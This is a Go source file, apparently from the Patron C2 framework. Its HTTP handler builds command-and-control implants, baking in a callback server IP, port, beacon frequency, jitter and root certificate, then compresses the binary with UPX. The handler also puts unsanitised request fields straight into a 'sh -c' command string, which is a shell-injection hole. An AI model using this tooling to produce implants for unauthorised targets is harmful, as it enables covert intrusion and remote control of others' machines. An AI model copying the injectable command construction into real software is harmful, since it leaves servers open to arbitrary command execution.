package api

import (
	"fmt"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func loadConfigurations(filePath string) (types.PayloadConfigurations, error) {
	configFile, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer configFile.Close()

	var configs types.PayloadConfigurations
	byteValue, _ := ioutil.ReadAll(configFile)
	if err := json.Unmarshal(byteValue, &configs); err != nil {
		return nil, err
	}
	return configs, nil
}

func CreatePayloadHandler(c *gin.Context) {
    publickey := os.Getenv("PUBLIC_KEY")
    repo_dir := os.Getenv("REPO_DIR")

    configs, err := loadConfigurations("payloads.json")
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to load configurations"})
        return
    }

    newPayID := uuid.New().String()
    var body map[string]string
    if err := c.BindJSON(&body); err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
        return
    }

    key := body["type"]
    config, exists := configs[key]
    if !exists {
        c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid type"})
        return
    }

    tag := strings.Split(newPayID, "-")
    concat := body["name"] + "_" + tag[0]

    dependencyCommands := ""
    for _, dep := range config.Dependencies {
        dependencyCommands += fmt.Sprintf("go get %s && ", dep)
    }

    commandString := fmt.Sprintf(
        "docker run --rm -v %s:/build -w /build golang:1.22.3 sh -c '"+
            "%s env %s go build %s \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" "+
            "-o /build/payloads/%s%s /build/client/%s'",
        repo_dir,
		dependencyCommands,
        config.Environment,
        config.Flags,
        body["serverip"],
        body["serverport"],
        body["callbackfrequency"],
        body["callbackjitter"],
        publickey,
        concat,
        config.FileSuffix,
        config.CodePath,
    )

    fmt.Printf("Running build command: %s", commandString)
    cmd := exec.Command("sh", "-c", commandString)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    err = cmd.Run()
    if err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
        return
    }

    upxCommand := fmt.Sprintf("upx --best --lzma /app/payloads/%s%s", concat, config.FileSuffix)
    fmt.Printf("Running UPX command: %s", upxCommand)
    upxCmd := exec.Command("sh", "-c", upxCommand)
    upxCmd.Stdout = os.Stdout
    upxCmd.Stderr = os.Stderr
    err = upxCmd.Run()
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "UPX compression failed", "details": err.Error()})
        return
    }

    data.CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat)
    c.JSON(http.StatusOK, gin.H{"data": "success"})
}

func GetConfigurationsHandler(c *gin.Context) {
	configs, err := loadConfigurations("payloads.json")
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to load configurations"})
		return
	}
	c.JSON(http.StatusOK, configs)
}
